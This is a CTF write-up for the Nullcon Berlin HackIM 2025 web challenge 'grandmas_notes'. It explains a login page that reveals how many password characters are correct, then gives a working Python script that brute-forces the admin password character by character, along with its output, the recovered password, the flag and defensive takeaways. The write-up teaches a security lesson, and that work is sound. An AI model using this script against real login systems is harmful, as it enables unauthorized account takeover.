---
title: "grandmas_notes - Nullcon Berlin HackIM 2025 CTF"
category: "web"
type: "writeup"
tags: ["web", "grandmas", "notes", "nullcon-berlin-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "We are given a web application running at:"
source:
  name: "CTFtime writeup #40401"
  url: "https://ctftime.org/writeup/40401"
ctf:
  name: "Nullcon Berlin HackIM 2025 CTF"
  year: 2025
  challenge: "grandmas_notes"
---

## Metadata

- **CTF:** Nullcon Berlin HackIM 2025 CTF
- **Task:** grandmas_notes
- **Author team:** numatrixx
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40401>

---
# Grandma's Notes – Prefix Oracle Exploit

## Challenge Description  
> My grandma is into vibe coding and has developed this web application to help her remember all the important information.   
> It would work great, if she wouldn't keep forgetting her password, but she's found a solution for that, too.

We are given a web application running at:  
```  
http://52.59.124.14:5015  
```

The task: **recover the flag hidden in Grandma's Notes.**

\---

## Reconnaissance  
\- Visiting the site shows a simple login form (`username`, `password`).  
\- When attempting to login with wrong credentials, the application responds with **"you got X characters correct"**.  
\- This is a classic **prefix oracle vulnerability**: the server leaks how many characters of the password match the real one.

\---

## Vulnerability  
Looking at the provided source code (`login.php`):

```php  
if ($user === "admin") {  
$correct = 0;  
for ($i = 0; $i < strlen($pass); $i++) {  
if ($pass[$i] !== $real[$i]) break;  
$correct++;  
}  
$_SESSION["flash"] = "you got $correct characters correct";  
}  
```

\- The application compares the input password with the real one character by character.  
\- It reveals the number of correct prefix characters via the session flash message.

This means we can brute-force the password **one character at a time**.

\---

## Exploitation

### Strategy  
1\. Start with an empty prefix.  
2\. Try all characters from a charset (`[a-zA-Z0-9{}... ]`).  
3\. For each attempt, check the server's response:  
\- If it says *"you got N characters correct"*, we know the current guess was correct for that position.  
4\. Append that character to the prefix.  
5\. Repeat until the full password is recovered.

\---

### Python Exploit Code  
```python  
import re, time, requests

URL = "http://52.59.124.14:5015"  
USER = "admin"  
CHARSET = "".join(chr(c) for c in range(32,127))

FLASH_RE = re.compile(r"you got\s+(\d+)\s+characters?\s+correct", re.I)  
DASH_RE = re.compile(r">\s*Dashboard\s*<|Logged in as", re.I)  
NOTE_RE = re.compile(r'<textarea[^>]*name=["\']note["\'][^>]*>([\s\S]*?)</textarea>', re.I)

def attempt(pw):  
s = requests.Session()  
r = [s.post](http://s.post)(f"{URL}/login.php", data={"username": USER, "password": pw}, allow_redirects=True)  
html = r.text  
if DASH_RE.search(html): return True, len(pw), html  
m = FLASH_RE.search(html)  
return (False, int(m.group(1)), html) if m else (False, 0, html)

found = ""  
while True:  
target = len(found)+1  
for ch in CHARSET:  
ok,prefix,html = attempt(found+ch)  
if ok:  
print("[+] Password:", found+ch)  
flag = NOTE_RE.search(html).group(1).strip()  
print("[+] Flag:", flag)  
exit()  
if prefix == target:  
found += ch  
print(f"[+] pos {len(found)}: {found}")  
break  
time.sleep(0.05)  
```

\---

## Results  
Running the script:

```  
[+] pos 1: Y  
[+] pos 2: Yz  
[+] pos 3: YzU  
...  
[+] pos 16: YzUnh2ruQix9mBWv  
[+] LOGIN SUCCESS  
[+] Flag: ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}  
```

\---

## Takeaways  
\- Prefix-oracle vulnerabilities can completely leak secret credentials.  
\- Never leak partial correctness in authentication.  
\- Use constant-time comparisons for secrets.

\---

## Flag  
```  
ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}  
```
